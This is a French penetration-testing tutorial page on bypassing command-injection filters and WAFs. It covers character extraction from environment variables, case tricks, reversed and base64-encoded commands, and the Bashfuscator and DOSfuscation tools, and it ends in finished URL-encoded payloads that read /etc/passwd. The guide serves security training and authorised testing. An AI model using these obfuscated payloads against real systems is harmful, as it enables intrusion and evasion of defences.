# Contournement avancé

## Pourquoi

Les techniques de base (guillemets, tabulations, newline) ne suffisent pas toujours face à des filtres sophistiqués ou des WAF. Quand un caractère critique comme le slash ou le point-virgule est bloqué, il faut le reconstruire autrement. Quand une commande entière est blacklistée, il faut la rendre méconnaissable tout en préservant son exécution. Cette page couvre les techniques avancées d'obfuscation, côté Linux et Windows, ainsi que les outils qui automatisent ce processus.

## Comment ça marche

### Reconstruire des caractères bloqués

Quand un caractère indispensable (slash `/`, backslash `\`, point-virgule `;`) est filtré, on peut le fabriquer à partir de données déjà présentes sur le système. Les variables d'environnement contiennent tous les caractères dont on a besoin, il suffit d'en extraire le bon.

{% tabs %}
{% tab title="Linux" %}

**Extraction depuis les variables d'environnement**

Chaque variable d'environnement est une chaîne indexable. La syntaxe `${VAR:position:longueur}` permet d'en extraire un caractère précis.

```bash
# - Le premier caractère de $PATH est toujours un /
echo ${PATH:0:1}
# /

# - Extraire un ; depuis $LS_COLORS (position variable selon le système)
echo ${LS_COLORS:10:1}
# ;
```

Pour identifier les variables disponibles et les caractères qu'elles contiennent :

```bash
# - Lister toutes les variables d'environnement
printenv

# - Chercher un caractère spécifique dans $PATH
echo ${PATH} | fold -w1 | grep -n "/"
```

En injection, on remplace directement le caractère bloqué par l'extraction. Par exemple, pour écrire `/etc/passwd` sans utiliser de slash :

```bash
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

**Décalage de caractères (character shifting)**

On peut aussi produire un caractère en décalant son voisin dans la table ASCII. Pour obtenir `\` (position 92), on utilise `[` (position 91) et on décale de +1 :

```bash
# - Consulter la table ASCII
man ascii

# - Décaler [ (91) vers \ (92)
echo $(tr '!-}' '"-~'<<<[)
# \
```

{% endtab %}
{% tab title="Windows CMD" %}

**Extraction depuis les variables d'environnement**

La syntaxe CMD `%VARIABLE:~début,fin%` fonctionne de manière similaire. Les positions négatives comptent depuis la fin.

```cmd
:: - Extraire \ depuis %HOMEPATH% (\Users\htb-student)
echo %HOMEPATH:~0,1%
:: \

:: - Variante avec positions calculées
echo %HOMEPATH:~6,-11%
:: \
```

{% endtab %}
{% tab title="PowerShell" %}

**Extraction depuis les variables d'environnement**

En PowerShell, chaque chaîne est un tableau de caractères accessible par index.

```powershell
# - Premier caractère de HOMEPATH -> \
$env:HOMEPATH[0]
# \

# - Extraire un espace depuis PROGRAMFILES
$env:PROGRAMFILES[10]

# - Lister toutes les variables disponibles
Get-ChildItem Env:
```

{% endtab %}
{% endtabs %}

---

### Obfuscation par manipulation de casse

Les filtres par blacklist comparent souvent la commande en minuscules exactes. Modifier la casse permet de passer à travers le filtre tout en gardant une commande fonctionnelle.

{% tabs %}
{% tab title="Linux" %}

Linux est sensible à la casse : `WhOaMi` seul ne fonctionnera pas. Il faut convertir la chaîne en minuscules avant de l'exécuter.

```bash
# - Conversion avec tr
$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")

# - Conversion avec l'expansion bash (version 4+)
$(a="WhOaMi";printf%09%s%09"${a,,}")
```

{% hint style="warning" %}
Les espaces dans ces commandes doivent aussi être remplacés par `%09` (tabulation) si le filtre les bloque. Chaque caractère filtré doit être contourné individuellement, y compris ceux introduits par la technique d'obfuscation elle-même.
{% endhint %}

{% endtab %}
{% tab title="Windows" %}

CMD et PowerShell sont insensibles à la casse. La commande fonctionne directement :

```powershell
WhOaMi
# -> nom de l'utilisateur courant
```

Cette simplicité rend la manipulation de casse particulièrement efficace sur les serveurs Windows, car aucune conversion supplémentaire n'est nécessaire.

{% endtab %}
{% endtabs %}

---

### Obfuscation par inversion de commande

On écrit la commande à l'envers dans le payload, puis on la retourne au moment de l'exécution. Le mot blacklisté n'apparaît jamais en clair dans la requête.

{% tabs %}
{% tab title="Linux" %}

```bash
# - Obtenir la version inversée
echo 'whoami' | rev
# imaohw

# - Exécuter la commande inversée via un sous-shell
$(rev<<<'imaohw')
# -> www-data (ou l'utilisateur courant)
```

Pour des commandes plus complexes avec des caractères filtrés, inverser la commande entière inclut aussi ces caractères, ce qui permet de les contourner en même temps.

{% endtab %}
{% tab title="Windows PowerShell" %}

```powershell
# - Inverser une chaîne
"whoami"[-1..-20] -join ''
# imaohw

# - Exécuter via Invoke-Expression
iex "$('imaohw'[-1..-20] -join '')"
# -> nom de l'utilisateur courant
```

{% endtab %}
{% endtabs %}

---

### Obfuscation par encodage

L'encodage permet de transmettre une commande complète sans qu'aucun de ses caractères n'apparaisse en clair. C'est la technique la plus polyvalente quand plusieurs caractères sont filtrés simultanément.

{% tabs %}
{% tab title="Linux (base64)" %}

```bash
# - Encoder la commande
echo -n 'cat /etc/passwd | grep 33' | base64
# Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==

# - Décoder et exécuter dans un sous-shell
bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

{% hint style="success" %}
On utilise `<<<` (here-string) au lieu de `|` (pipe) pour éviter un caractère potentiellement filtré. Si `bash` est lui aussi blacklisté, utiliser `sh` à la place, ou obfusquer `bash` avec les techniques vues précédemment (guillemets, backslash).
{% endhint %}

Alternatives si `base64` est bloqué :

```bash
# - Encodage hexadécimal avec xxd
echo -n 'whoami' | xxd -p
# 77686f616d69

# - Décodage et exécution
bash<<<$(xxd -r -p<<<77686f616d69)
```

{% endtab %}
{% tab title="Windows PowerShell" %}

```powershell
# - Encoder en base64 (encodage Unicode/UTF-16LE requis par PowerShell)
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
# dwBoAG8AYQBtAGkA

# - Décoder et exécuter
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

{% endtab %}
{% tab title="Encodage cross-platform" %}

Pour préparer un payload Windows base64 depuis un système Linux, il faut convertir la chaîne en UTF-16LE avant l'encodage :

```bash
# - Encoder une commande Windows depuis Linux
echo -n 'whoami' | iconv -f utf-8 -t utf-16le | base64
# dwBoAG8AYQBtAGkA
```

Le résultat est directement utilisable dans le décodeur PowerShell.

{% endtab %}
{% endtabs %}

---

### Outils d'obfuscation automatisée

Quand les filtres sont trop stricts pour une obfuscation manuelle, des outils spécialisés peuvent générer des payloads complexes automatiquement.

{% tabs %}
{% tab title="Bashfuscator (Linux)" %}

[Bashfuscator](https://github.com/Bashfuscator/Bashfuscator) génère des commandes bash obfusquées en combinant plusieurs techniques.

```bash
# - Installation
git clone https://github.com/Bashfuscator/Bashfuscator
cd Bashfuscator
pip3 install setuptools==65
python3 setup.py install --user

# - Générer un payload compact
./bashfuscator/bin/bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

Résultat typique :

```bash
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
```

```bash
# - Vérifier le payload localement
bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'
```

{% hint style="warning" %}
Sans les flags de limitation (`-s 1 -t 1 --no-mangling --layers 1`), l'outil peut produire des payloads de plusieurs milliers de caractères, voire plus d'un million. Ces payloads démesurés sont rarement utilisables en injection web.
{% endhint %}

{% endtab %}
{% tab title="DOSfuscation (Windows)" %}

[DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation) est un outil PowerShell interactif qui obfusque des commandes Windows.

```powershell
# - Installation et lancement
git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
cd Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation

# - Dans l'interface interactive
Invoke-DOSfuscation> SET COMMAND type C:\Users\user\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1
```

Le résultat utilise les variables d'environnement Windows pour reconstruire chaque caractère :

```cmd
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\...
```

{% hint style="info" %}
DOSfuscation est aussi utilisable depuis Linux via `pwsh` (PowerShell Core). Il est préinstallé sur Exegol et installable via les [instructions officielles Microsoft](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-core-on-linux).
{% endhint %}

{% endtab %}
{% endtabs %}

## En pratique

### Workflow d'obfuscation manuelle

Depuis un conteneur Exegol :

```bash
# - Étape 1 : identifier les caractères filtrés
# Tester un par un : ;  espace  /  |  &  commande

# - Étape 2 : reconstruire les caractères manquants
SLASH=${PATH:0:1}
SEMICOLON=${LS_COLORS:10:1}

# - Étape 3 : obfusquer la commande
# Option A : guillemets
w'h'o'am'i

# Option B : base64
bash<<<$(base64%09-d<<<d2hvYW1p)

# Option C : inversion
$(rev<<<'imaohw')

# - Étape 4 : assembler le payload complet
# Exemple : exécuter "whoami" avec newline comme opérateur, tab comme espace
# 127.0.0.1%0a$(rev<<<'imaohw')
```

### Construction progressive d'un payload

Pour une injection sur un champ IP avec filtres sur `;`, espace, `/`, `|`, et la commande `cat` :

```bash
# - Opérateur : newline (%0a) - non filtré
# - Espace : ${IFS} ou %09
# - Slash : ${PATH:0:1}
# - Commande : c'a't ou $(rev<<<'tac')

# Payload final URL-encodé :
127.0.0.1%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
```

## Pièges et galères

- **L'obfuscation introduit des caractères filtrés** : une commande comme `$(tr "[A-Z]" "[a-z]"<<<"CMD")` contient des espaces. Si l'espace est filtré, il faut les remplacer par `%09` dans le payload final. Toujours vérifier que la technique d'obfuscation elle-même ne déclenche pas un filtre.
- **Variables d'environnement absentes** : `$LS_COLORS` n'est pas définie dans tous les environnements (conteneurs minimaux, shells non-interactifs). Tester avec `printenv` ou utiliser `$PATH` qui est quasi universel.
- **Bashfuscator et les espaces** : les payloads générés contiennent souvent des espaces. Il faut les remplacer manuellement avant de les utiliser en injection.
- **Encodage Windows vs Linux** : PowerShell utilise UTF-16LE pour le base64, pas UTF-8. Un payload encodé depuis Linux sans conversion `iconv` ne sera pas décodable côté Windows.
- **Longueur du payload** : certains champs de formulaire ou paramètres GET ont une longueur maximale. Les payloads obfusqués peuvent dépasser cette limite.

## Retour terrain

L'obfuscation avancée est rarement nécessaire lors d'un premier passage. En général, on commence par les techniques simples (guillemets, newline, tabulation) et on n'escalade vers l'encodage base64 ou les outils automatisés que si les filtres résistent.

Les outils comme Bashfuscator sont utiles pour générer des idées de payloads, mais leurs résultats demandent presque toujours un ajustement manuel pour passer les filtres spécifiques de l'application testée. En pratique, la combinaison la plus fiable reste : newline comme opérateur, tabulation ou `${IFS}` comme espace, extraction de variables pour les slashes, et encodage base64 pour la commande complète.

Sur les environnements Windows, la manipulation de casse est le premier réflexe (gratuit et instantané), suivie de l'encodage PowerShell base64 si nécessaire. DOSfuscation entre en jeu face à des WAF avancés qui détectent les patterns d'encodage classiques.

## Mémo express

| Technique | Linux | Windows |
|---|---|---|
| Extraire `/` ou `\` | `${PATH:0:1}` | `%HOMEPATH:~0,1%` / `$env:HOMEPATH[0]` |
| Extraire `;` | `${LS_COLORS:10:1}` | N/A (utiliser `%0a` ou `&`) |
| Décalage ASCII | `$(tr '!-}' '"-~'<<<[)` | N/A |
| Manipulation de casse | `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | `WhOaMi` (natif) |
| Commande inversée | `$(rev<<<'imaohw')` | `iex "$('imaohw'[-1..-20] -join '')"` |
| Encodage base64 | `bash<<<$(base64 -d<<<PAYLOAD)` | `iex "$([...FromBase64String('PAYLOAD')])"` |
| Outil automatisé | Bashfuscator | DOSfuscation |

***
